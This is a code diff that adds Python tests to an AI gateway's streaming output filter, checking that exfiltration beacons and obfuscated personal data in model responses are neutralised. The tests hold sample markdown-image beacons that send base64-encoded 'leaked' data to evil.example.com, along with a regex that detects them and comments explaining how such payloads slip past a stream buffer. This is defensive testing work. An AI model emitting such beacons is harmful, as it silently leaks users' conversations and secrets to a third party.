@@ -36,6 +36,7 @@ suite's stubbing discipline.
 from __future__ import annotations
 
 import asyncio
+import base64
 import json
 import sys
 import types
@@ -73,12 +74,14 @@ if "litellm" not in sys.modules:
     sys.modules["litellm.exceptions"] = fake_exceptions
 
 try:  # tolerate both import roots used across this suite
-    from secure_streaming import SecureStreamingResponse, STREAM_LOOKAHEAD_BYTES
+    from secure_streaming import (
+        SecureStreamingResponse, STREAM_LOOKAHEAD_BYTES, MAX_OPEN_MEDIA_HOLDBACK,
+    )
     from scanner import InputScanner
     from patterns import detect_pii, redact_all
 except ImportError:  # pragma: no cover
     from ai_mesh_gateway.secure_streaming import (
-        SecureStreamingResponse, STREAM_LOOKAHEAD_BYTES,
+        SecureStreamingResponse, STREAM_LOOKAHEAD_BYTES, MAX_OPEN_MEDIA_HOLDBACK,
     )
     from ai_mesh_gateway.scanner import InputScanner
     from ai_mesh_gateway.patterns import detect_pii, redact_all
@@ -425,6 +428,146 @@ def test_clean_stream_delivered_intact(use_guard):
         f"clean stream was altered/truncated (use_guard={use_guard}): "
         f"{delivered!r} != {expected!r}"
     )
+
+
+# --------------------------------------------------------------------------- #
+# G40: a markdown-image EXFIL BEACON whose base64 payload exceeds buffer_max_bytes.
+#
+# A base64/hex exfil payload contains NO SENTENCE_BOUNDARIES char, so a beacon whose
+# payload is larger than buffer_max_bytes (4096) forces a mid-URL BUFFER_LIMIT flush.
+# The unclosed ``![x](https://evil…/?d=<partial>`` matches no exfil pattern (clean
+# verdict); absent the fix its prefix is released-with-lookahead and the client
+# reassembles the COMPLETE zero-click auto-render beacon => exfil of the whole blob.
+#
+# FIX (two parts, both proved here):
+#   1) secure_streaming: hold an UNCLOSED media opener at the buffer tail
+#      (_open_media_opener_start / MAX_OPEN_MEDIA_HOLDBACK) so the completed beacon
+#      is scanned + defanged whole instead of released piecemeal;
+#   2) output_guard._url_smuggles_data: a bounded-prefix decode fallback so an
+#      OVERSIZED opaque blob (plaintext > the decode byte cap) is still recognised
+#      as an image beacon.
+# The no-OutputGuard fallback path also neutralizes exfil/encoded-PII now (G40).
+# --------------------------------------------------------------------------- #
+import re as _re_g40  # noqa: E402
+
+try:
+    from output_guard import OutputGuard as _RealOutputGuard  # noqa: E402
+except ImportError:  # pragma: no cover
+    from ai_mesh_gateway.output_guard import OutputGuard as _RealOutputGuard
+
+_G40_AUTORENDER = _re_g40.compile(r"!\[[^\]]*\]\(\s*https?://[^)]*evil[^)]*\)", _re_g40.I)
+
+
+def _run_real_guard(pieces) -> str:
+    scanner = InputScanner(config={})
+    # tier2 (Bedrock) disabled: the deterministic exfil-channel check is what this
+    # test exercises, and it keeps the test offline-clean + fast.
+    guard = _RealOutputGuard(scanner, {"output_tier2_enabled": False})
+    stream = SecureStreamingResponse(
+        _inner_from_pieces(pieces), scanner, redaction_enabled=True, output_guard=guard,
+    )
+    return asyncio.run(_drain(stream))
+
+
+@pytest.mark.parametrize("use_guard", [True, False], ids=["guard", "fallback"])
+def test_g40_streaming_oversized_beacon_no_autorender(use_guard):
+    blob = base64.b64encode(b"SYSTEM PROMPT LEAK merger RUBICON BetaCorp; " * 120).decode()
+    assert len(blob) > 4096, "test setup: payload must exceed buffer_max_bytes to force a mid-URL flush"
+    pieces = [f"Report ready. ![x](https://evil.example.com/l?d={blob}). Bye."]
+    delivered = _run_real_guard(pieces) if use_guard else _run(pieces, use_guard=False)
+    assert not _G40_AUTORENDER.search(delivered), (
+        f"[g40 use_guard={use_guard}] a zero-click auto-render exfil beacon reassembled "
+        f"client-side. delivered prefix={delivered[:120]!r}"
+    )
+    assert blob[:200] not in delivered, (
+        f"[g40 use_guard={use_guard}] {len(blob)} bytes of exfil payload leaked verbatim"
+    )
+
+
+def test_g40_streaming_split_beacon_across_boundary_no_autorender():
+    """Beacon split so the host '.' fires a NON-final flush mid-URL (unclosed opener);
+    the holdback must retain it until the ')' arrives and it is defanged whole."""
+    blob = base64.b64encode(b"exfil conversation payload here; " * 8).decode()
+    pieces = ["See ![x](https://evil.", f"example.com/log?d={blob}). Done."]
+    delivered = _run_real_guard(pieces)
+    assert not _G40_AUTORENDER.search(delivered), f"split beacon reassembled: {delivered[:120]!r}"
+
+
+@pytest.mark.parametrize("use_guard", [True, False], ids=["guard", "fallback"])
+def test_g40_cap_failclosed_oversized_unclosed_opener(use_guard):
+    """An unclosed media opener that grows past MAX_OPEN_MEDIA_HOLDBACK must FAIL
+    CLOSED: _defang_open_media replaces the opener with [exfil-redacted] in place, so
+    no auto-render beacon can reassemble even if a ')' arrives after the cap flush.
+    Covers the branch the other G40 tests don't (payload < cap, or closes first)."""
+    frag = "A" * 5000  # base64-charset, no boundary char and no ')' — stays unclosed
+    assert 3 * len(frag) > MAX_OPEN_MEDIA_HOLDBACK, "setup must exceed the holdback cap"
+    pieces = ["![x](https://evil.example.com/l?d=", frag, frag, frag, ") tail."]
+    delivered = _run_real_guard(pieces) if use_guard else _run(pieces, use_guard=False)
+    assert not _G40_AUTORENDER.search(delivered), (
+        f"[cap use_guard={use_guard}] auto-render beacon survived the cap defang: {delivered[:120]!r}"
+    )
+    assert "[exfil-redacted]" in delivered, (
+        f"[cap use_guard={use_guard}] the oversized opener was not defanged in place"
+    )
+    assert not ("![" in delivered and "](http" in delivered and "evil" in delivered), (
+        f"[cap use_guard={use_guard}] renderable beacon parts survived"
+    )
+
+
+# --------------------------------------------------------------------------- #
+# G45: streaming redaction parity with G44 (non-stream). Markdown-emphasis-split PII
+# (1**2**3-45-6789 -> renders as the SSN) must be masked on the STREAMED egress too —
+# the streaming redact composition previously ran only neutralize_exfil_channels +
+# neutralize_encoded_pii (G36), missing the G44 markdown-split neutralizer, so a
+# streamed obfuscated-PII response leaked. Proven on guard + no-guard fallback paths.
+# --------------------------------------------------------------------------- #
+@pytest.mark.parametrize("use_guard", [True, False], ids=["guard", "fallback"])
+def test_g45_streaming_markdown_split_pii_masked(use_guard):
+    pieces = ["The SSN is 1**2**", "3-45-6789 exactly. Reach john`@`example.com now."]
+    delivered = _run_real_guard(pieces) if use_guard else _run(pieces, use_guard=False)
+    rendered = delivered.replace("*", "").replace("`", "").replace("_", "")
+    assert "123-45-6789" not in rendered, (
+        f"[g45 use_guard={use_guard}] markdown-split SSN reached the client: {delivered!r}"
+    )
+    assert "john@example.com" not in rendered, (
+        f"[g45 use_guard={use_guard}] markdown-split email reached the client: {delivered!r}"
+    )
+    assert "[PII_REDACTED]" in delivered or "***" in delivered or "REDACT" in delivered.upper(), (
+        f"[g45 use_guard={use_guard}] obfuscated PII was neither masked nor blocked: {delivered!r}"
+    )
+
+
+# --------------------------------------------------------------------------- #
+# G46: a tier-2 (Bedrock) verdict can flag FREE-TEXT PII (person names / non-standard
+# layouts) the DETERMINISTIC regex redactor has no pattern for, returning the spans in
+# verdict.redaction_spans. The non-stream _sanitize_output_core masks them via
+# _mask_spans_typed; the streaming redact path called redact_pii ALONE, so those spans
+# egressed VERBATIM on the streamed channel. G46 mirrors the span-masking on the stream.
+# --------------------------------------------------------------------------- #
+class _SemanticSpanGuard:
+    """Stub tier-2 guard flagging a free-text span the deterministic regex can't match."""
+
+    def __init__(self, span: str):
+        self._span = span
+
+    async def inspect(self, text, *, context_chunks=None, org_config=None, org_slug=""):
+        return types.SimpleNamespace(
+            action="redact", threat_type="pii", matched_patterns=["person_name"],
+            redaction_spans=[self._span], matched_values={}, detail="",
+            compliance_tags=[], scan_degraded=False,
+        )
+
+
+def test_g46_streaming_masks_tier2_semantic_span():
+    name = "Johnathan Q. Publicova"
+    scanner = InputScanner(config={})
+    stream = SecureStreamingResponse(
+        _inner_from_pieces([f"The patient's full name is {name}, age 44."]),
+        scanner, redaction_enabled=True, output_guard=_SemanticSpanGuard(name),
+    )
+    delivered = asyncio.run(_drain(stream))
+    assert name not in delivered, f"tier-2 semantic PII span leaked on stream: {delivered!r}"
+    assert "REDACTED" in delivered.upper(), f"semantic span not masked on stream: {delivered!r}"
 
 
 if __name__ == "__main__":  # pragma: no cover
